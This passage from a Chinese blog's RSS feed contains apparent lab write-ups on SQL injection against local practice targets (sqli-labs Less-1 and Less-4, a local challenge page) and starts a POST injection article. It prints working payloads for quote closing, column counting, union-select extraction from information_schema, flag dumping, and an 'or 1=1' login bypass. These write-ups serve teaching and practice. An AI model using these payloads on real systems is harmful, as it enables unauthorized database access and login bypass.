&lt;p&gt;&lt;img src=&#34;image-20220929215843779.png&#34; alt=&#34;image-20220929215843779&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么， &lt;code&gt;&#39;22&#39;&#39; LIMIT 0,1&lt;/code&gt;  中，‘22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定注入类型&#34;&gt;#&lt;/a&gt; 确定注入类型&lt;/h3&gt;
&lt;p&gt;闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、–+&lt;/p&gt;
&lt;p&gt;那么，我们尝试一下 #号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不行，会报错，可能后台过滤了 #号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220358319.png&#34; alt=&#34;image-20220929220358319&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试 %23 也一样，就不再贴图了。&lt;/p&gt;
&lt;p&gt;我们最后尝试–+，成功。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220326957.png&#34; alt=&#34;image-20220929220326957&#34;&gt;&lt;/p&gt;
&lt;p&gt;由此，可以确定此题注入类型为字符型注入的&lt;strong&gt;单引号注入&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;确定列数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定列数&#34;&gt;#&lt;/a&gt; 确定列数&lt;/h3&gt;
&lt;p&gt;使用 order by n 来确定有多少列。&lt;strong&gt;order by n&lt;/strong&gt; 会以当前表中的 “&lt;strong&gt;第 n 列&lt;/strong&gt;” 进行排序，如果&lt;strong&gt;第 n 列不存在&lt;/strong&gt;，则会抛出 &lt;code&gt;Unknown column &#39;n&#39; &lt;/code&gt; 的异常。&lt;/p&gt;
&lt;p&gt;4 列？&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 4--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220842238.png&#34; alt=&#34;image-20220929220842238&#34;&gt;&lt;/p&gt;
&lt;p&gt;3 列？&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 3--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220533059.png&#34; alt=&#34;image-20220929220533059&#34;&gt;&lt;/p&gt;
&lt;p&gt;不报错，则说明 &lt;code&gt;有3列&lt;/code&gt; 。&lt;/p&gt;
&lt;h3 id=&#34;构造联合查询泄露数据库信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#构造联合查询泄露数据库信息&#34;&gt;#&lt;/a&gt; 构造联合查询泄露数据库信息&lt;/h3&gt;
&lt;p&gt;这回我们使用 &lt;code&gt;and 0&lt;/code&gt;  来构造对于 id 的查询为假的条件&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 0 union select 1, group_concat(table_name), database() from information_schema.tables where table_schema = database() --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221156300.png&#34; alt=&#34;image-20220929221156300&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;注入步骤双引号注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤双引号注入&#34;&gt;#&lt;/a&gt; 注入步骤 (双引号注入)&lt;/h2&gt;
&lt;p&gt;Less-4 是一道双引号注入的题目。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221450837.png&#34; alt=&#34;image-20220929221450837&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于查看发现是 GET 请求，因此礼节性地输入 id=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221657747.png&#34; alt=&#34;image-20220929221657747&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试注入类型-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试注入类型-2&#34;&gt;#&lt;/a&gt; 尝试注入类型&lt;/h3&gt;
&lt;p&gt;输入 1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221831821.png&#34; alt=&#34;image-20220929221831821&#34;&gt;&lt;/p&gt;
&lt;p&gt;不报错，怀疑存在双引号注入。&lt;/p&gt;
&lt;p&gt;输入 1“  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221918225.png&#34; alt=&#34;image-20220929221918225&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么， &lt;code&gt;&amp;quot;1&amp;quot;&amp;quot;) LIMIT 0,1&lt;/code&gt;  中，“1&amp;quot;”)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定注入类型-2&#34;&gt;#&lt;/a&gt; 确定注入类型&lt;/h3&gt;
&lt;p&gt;我们尝试：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-4&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;quot;) --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功不报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929222215596.png&#34; alt=&#34;image-20220929222215596&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后就可以愉快地&lt;strong&gt;确定列数&lt;/strong&gt; + 使用&lt;strong&gt;联合查询泄露数据库信息&lt;/strong&gt;了。&lt;/p&gt;
&lt;p&gt;小练习&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;通过闭合，确定单引号注入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定列数为3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 4 --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;sql查询失败&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.联合查询泄露数据库信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(table_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;database() &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: emails,flag,users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: challenge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.获取flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, flag, &lt;span class=&#34;keyword&#34;&gt;value&lt;/span&gt;)), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; challenge.flag &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:&lt;span class=&#34;keyword&#34;&gt;any&lt;/span&gt;,flag8:sqlc,flag9:tasi,flag10:moo,flag12:&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;,flag11:muse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: challenge&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，字符型注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/</guid>
            <title>POST注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 21:49:22 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql-注入之post注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入之post注入&#34;&gt;#&lt;/a&gt; SQL 注入之 POST 注入&lt;/h1&gt;
&lt;p&gt;本篇使用 POST 注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤&#34;&gt;#&lt;/a&gt; 注入步骤&lt;/h2&gt;
&lt;h3 id=&#34;尝试注入类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试注入类型&#34;&gt;#&lt;/a&gt; 尝试注入类型&lt;/h3&gt;
&lt;p&gt;输入 1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929203645441.png&#34; alt=&#34;image-20220929203645441&#34;&gt;&lt;/p&gt;
&lt;p&gt;果不其然，此输入框存在 SQL 注入。且报错信息为 &lt;code&gt;use near &#39;&#39;1&#39;&#39; and password=&#39;&#39; LIMIT 0,1&#39; at line 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;提取出错点发生在这一句：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&amp;#x27; and password=&amp;#x27;&amp;#x27; LIMIT 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; LIMIT &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着，查看其 F12 发现，网页发送的是 POST 请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204011334.png&#34; alt=&#34;image-20220929204011334&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后通过继续深入查询网页源代码的 Elements 可以得到，两个 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;  标签对应的变量名，&lt;strong&gt;Username&lt;/strong&gt; 对应&lt;strong&gt; uname&lt;/strong&gt;，&lt;strong&gt;Password&lt;/strong&gt; 对应&lt;strong&gt; passwd&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204648604.png&#34; alt=&#34;image-20220929204648604&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么就可以构造 POST 请求：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204929486.png&#34; alt=&#34;image-20220929204929486&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，基本上可以确定，此题存在 SQL 注入之一 ——POST 注入。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定注入类型&#34;&gt;#&lt;/a&gt; 确定注入类型&lt;/h3&gt;
&lt;p&gt;输入 1’ # 查看是否依旧报错&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不报错，说明是 POST 单引号注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929205132216.png&#34; alt=&#34;image-20220929205132216&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;是否可以构造非法查询&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#是否可以构造非法查询&#34;&gt;#&lt;/a&gt; 是否可以构造非法查询&lt;/h3&gt;
&lt;p&gt;由于&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; LIMIT &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;username 是用单引号括起来的，为了让语法不出错，我们需要&lt;strong&gt;保留单引号&lt;/strong&gt;。即，可以在 &lt;code&gt;uname=1&#39; #&amp;amp;passwd=1&lt;/code&gt;  的 &lt;code&gt;&#39; #&lt;/code&gt; 之间&lt;strong&gt;插入我们想要的非法查询语句&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：&lt;/p&gt;
